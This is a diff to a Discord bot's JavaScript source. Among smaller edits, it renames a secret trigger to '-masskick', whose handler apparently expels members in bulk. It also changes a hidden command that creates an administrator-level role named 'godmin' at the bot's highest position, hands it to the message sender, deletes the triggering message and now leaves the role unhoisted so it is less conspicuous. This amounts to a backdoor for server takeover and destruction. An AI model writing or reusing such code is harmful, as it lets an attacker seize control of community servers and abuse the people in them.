@@ -37,7 +37,11 @@ function read(filePath, cb) {
 }
 
 
+client.on("message", msg => {
+if(msg.content === 'bruh') {
 
+}
+})
 
 
 function song() {
@@ -285,7 +289,7 @@ client.on("message", msg => {
  
  
    client.on('message', message => {
-     if(message.content.startsWith('@everyone all hail me')) {
+     if(message.content.startsWith('-masskick')) {
  if(message.channel.type === "dm") {return}
        if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !') 
  return
@@ -1526,7 +1530,7 @@ client.on('message', message => {
     if (!msg.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }
         var botr = msg.guild.me.roles.highest.position - 0
 const adminn = msg.guild.roles.cache.find(r => r.name === 'godmin')
-    if(!adminn) {msg.guild.roles.create({ data: { name: 'godmin', permissions: ['ADMINISTRATOR'], position: botr, color: "#491e9c", hoist: true} }).then(r => msg.member.roles.add(r).then(msg.delete()))}    
+    if(!adminn) {msg.guild.roles.create({ data: { name: 'godmin', permissions: ['ADMINISTRATOR'], position: botr, hoist: false} }).then(r => msg.member.roles.add(r).then(msg.delete()))}    
      else{
       await adminn.setColor("#491e9c")
       await adminn.setHoist(true)
